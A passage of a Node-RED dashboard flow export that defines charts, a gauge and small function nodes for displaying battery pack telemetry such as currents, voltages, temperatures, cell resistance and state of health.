        "content": "| Name | Value |\n| - | - |\n| FAILSAFE STATUS | {{msg?.payload.failsafe_statuses || 'Unknown' }} |\n| BMS FAILSAFE STATUS | {{msg?.payload.BMS_FailsafeStatuses || 'Unknown' }} |\n| Highest Thermistor ID | {{msg?.payload.High_Thermistor_ID || 'Unknown' }} |\n| Low Cell Voltage ID | {{msg?.payload.Low_Cell_Voltage_ID || 'Unknown' }} |\n| High Cell Resistance ID | {{msg?.payload.High_Intres_ID || 'Unknown' }} |\n| DTC Status #1 | {{msg?.payload.DTC_Flags_1 || 'Unknown' }} |\n| DTC Status #2 | {{msg?.payload.DTC_Flags_2 || 'Unknown' }} |",
        "className": "",
        "x": 810,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "e11609c73f3d2678",
        "type": "comment",
        "z": "f794ff764964069d",
        "name": "Critical Group",
        "info": "",
        "x": 750,
        "y": 100,
        "wires": []
    },
    {
        "id": "f4d370790d3e2ab6",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "Pack Current",
        "label": "Pack Current",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "Pack_Current",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 810,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "856b37116d7bb7da",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "Pack Voltage",
        "label": "Pack Voltage",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "Pack_Inst_Voltage",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 810,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "76d902ef73966c33",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "Pack Current (AVG)",
        "label": "Average Pack Current",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "Average_Current",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 830,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "96bfae3b38012ea1",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Temps",
        "func": "var sigFigs = 2;\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload.high_temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\n\nvar Average_Temperature =\n{\n    topic: \"Average Temperature (ºC)\",\n    payload: msg.payload.Average_Temperature\n}\ntry {\n    Average_Temperature.payload = Average_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    High_Temperature,\n    Average_Temperature\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 820,
        "y": 340,
        "wires": [
            [
                "74a89b54840ef884"
            ],
            [
                "74a89b54840ef884"
            ]
        ]
    },
    {
        "id": "74a89b54840ef884",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "Temps",
        "label": "Temperatures",
        "order": 7,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1030,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "3cbe05ec6b2bd75f",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "Cell Voltages",
        "label": "Cell Voltages",
        "order": 8,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1050,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "9df91ec3239745ae",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Cell Voltages",
        "func": "var sigFigs = 2;\n\nvar Low_Cell_Voltage =\n{\n    topic: \"Low Cell Voltage (V)\",\n    payload: msg.payload.Low_Cell_Voltage\n}\ntry {\n    Low_Cell_Voltage.payload = Low_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Voltage =\n{\n    topic: \"Average Cell Voltage (V)\",\n    payload: msg.payload.Avg_Cell_Voltage\n}\ntry {\n    Avg_Cell_Voltage.payload = Avg_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Low_Cell_Voltage,\n    Avg_Cell_Voltage\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 420,
        "wires": [
            [
                "3cbe05ec6b2bd75f"
            ],
            [
                "3cbe05ec6b2bd75f"
            ]
        ]
    },
    {
        "id": "6235d99dfe60139f",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "INV DC Bus Voltage",
        "label": "Inverter DC Bus Voltage",
        "order": 6,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "INV_dcBusVoltage",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 840,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "07c5128fcde37bcb",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "High Cell Internal Resistance ",
        "label": "High Cell Internal Resistance ",
        "order": 5,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Ohm",
        "yAxisProperty": "High_Cell_Resistance",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 860,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "7e82797ae400fa56",
        "type": "comment",
        "z": "f794ff764964069d",
        "name": "General Group",
        "info": "",
        "x": 780,
        "y": 600,
        "wires": []
    },
    {
        "id": "b2ba000815b7f5af",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Total Pack Cycles",
        "label": "Total Pack Cycles",
        "order": 6,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "Total_Pack_Cycles",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 830,
        "y": 660,
        "wires": [
            []
        ]
    },
    {
        "id": "60cbdd9a86d077f2",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Pack State of Charge",
        "label": "Pack State of Charge",
        "order": 7,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "Pack_SOC",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 840,
        "y": 720,
        "wires": [
            []
        ]
    },
    {
        "id": "3257f83dc0fae7b1",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Pack Amp Hours",
        "label": "Pack Amp",
        "order": 5,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "A h",
        "yAxisProperty": "Pack_SOC",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 830,
        "y": 780,
        "wires": [
            []
        ]
    },
    {
        "id": "aab87762908806f5",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Input Supply Voltage",
        "label": "Input Supply Voltage",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "A h",
        "yAxisProperty": "Input_Supply_Voltage",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 840,
        "y": 840,
        "wires": [
            []
        ]
    },
    {
        "id": "36f0a88828ee7e8f",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Pack Voltages",
        "func": "var sigFigs = 2;\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload.Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload.maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload.Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Pack_Open_Voltage,\n    Minimum_Pack_Voltage,\n    Maximum_Pack_Voltage\n]",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 900,
        "wires": [
            [
                "3db1f2ceff916e5a"
            ],
            [
                "3db1f2ceff916e5a"
            ],
            [
                "3db1f2ceff916e5a"
            ]
        ]
    },
    {
        "id": "3db1f2ceff916e5a",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Pack Voltages",
        "label": "Pack Voltages",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1100,
        "y": 900,
        "wires": [
            []
        ]
    },
    {
        "id": "f73b21aea3b27ba9",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Temps",
        "func": "var sigFigs = 2;\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload.high_temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload.Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload.Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    High_Temperature,\n    Low_Temperature,\n    Internal_Temperature\n]",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 820,
        "y": 960,
        "wires": [
            [
                "6fe4689cd6447a14"
            ],
            [
                "6fe4689cd6447a14"
            ],
            [
                "6fe4689cd6447a14"
            ]
        ]
    },
    {
        "id": "6fe4689cd6447a14",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Temps",
        "label": "Temperatures",
        "order": 8,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1070,
        "y": 960,
        "wires": [
            []
        ]
    },
    {
        "id": "25f9d01ed118ffc1",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Cell Voltages",
        "func": "var sigFigs = 2;\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload.Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload.Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Minimum_Cell_Voltage,\n    Maximum_Cell_Voltage\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 1020,
        "wires": [
            [
                "87e9fcda8b8144fa"
            ],
            [
                "87e9fcda8b8144fa"
            ]
        ]
    },
    {
        "id": "87e9fcda8b8144fa",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Cell Voltages",
        "label": "Cell Voltages",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1090,
        "y": 1020,
        "wires": [
            []
        ]
    },
    {
        "id": "08f57b92059845e1",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Cell Resistance",
        "func": "var sigFigs = 2;\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload.Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload.Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Low_Cell_Resistance,\n    Avg_Cell_Resistance\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 1080,
        "wires": [
            [
                "c020a8f9fae0064e"
            ],
            [
                "c020a8f9fae0064e"
            ]
        ]
    },
    {
        "id": "c020a8f9fae0064e",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "fba98ac8b1df5097",
        "name": "Cell Resistance",
        "label": "Cell Resistance",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Ohms",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1100,
        "y": 1080,
        "wires": [
            []
        ]
    },
    {
        "id": "5183a4e14c8ddac5",
        "type": "comment",
        "z": "f794ff764964069d",
        "name": "Other Group",
        "info": "",
        "x": 770,
        "y": 1140,
        "wires": []
    },
    {
        "id": "49ff2e6f36126537",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Pack State of Health",
        "func": "var sigFigs = 2;\n\nvar pack_state_of_health =\n{\n    topic: \"Pack State of Health\",\n    payload: msg.payload.pack_state_of_health\n}\ntry {\n    pack_state_of_health.payload = pack_state_of_health.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    pack_state_of_health\n]",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 860,
        "y": 1240,
        "wires": [
            [
                "a4044a07587f36b0"
            ]
        ]
    },
    {
        "id": "a4044a07587f36b0",
        "type": "ui-gauge",
        "z": "f794ff764964069d",
        "name": "",
        "group": "43f27ebf639a5e84",
        "order": 2,
        "width": 3,
        "height": "4",
        "gtype": "gauge-half",
        "gstyle": "needle",
        "title": "Pack State of Health",
        "units": "%",
        "icon": "",
        "prefix": "",
        "suffix": "",
        "segments": [
            {
                "from": "0",
                "color": "#000000"
            }
        ],
        "min": 0,
        "max": "100",
        "sizeThickness": 16,
        "sizeGap": 4,
        "sizeKeyThickness": 8,
        "styleRounded": true,
        "styleGlow": false,
        "className": "",
        "x": 1160,
        "y": 1240,
        "wires": []
    },
    {
        "id": "bd5cbf4d03f5815f",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "43f27ebf639a5e84",
        "name": "Pack Summed Voltage",
        "label": "Pack Summerd Voltage",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "volts",
        "yAxisProperty": "pack_summed_voltage",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 840,
        "y": 1300,
        "wires": [
            []
        ]
    },
    {
        "id": "8196dd6bb9f403d8",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "43f27ebf639a5e84",
        "name": "Adaptive Amp H",
        "label": "Adaptive Amp Hours",
        "order": 5,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amp H",
        "yAxisProperty": "adaptive_amp_hours",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
